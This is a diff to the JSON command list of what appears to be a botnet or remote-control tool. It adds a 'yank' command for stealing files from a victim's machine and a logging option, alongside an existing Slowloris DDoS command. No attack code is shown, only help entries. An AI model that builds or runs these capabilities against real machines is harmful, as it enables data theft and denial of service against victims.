@@ -15,6 +15,11 @@
         "usage":"instances (number)"
     },
     {
+        "command":"logging",
+        "functionality":"Log the output to files",
+        "usage":"logging (boolean)"
+    },
+    {
         "command":"run",
         "functionality":"Runs custom scripts you have",
         "usage":"run (script name)"
@@ -43,5 +48,10 @@
         "command":"slowloris",
         "functionality":"Slowloris DDOS attack",
         "usage":"slowloris (ip) (port) (duration) (sockets)"
+    },
+    {
+        "command":"yank",
+        "functionality":"Steal a file from a victim's machine",
+        "usage":"yank (file name)"
     }
 ]
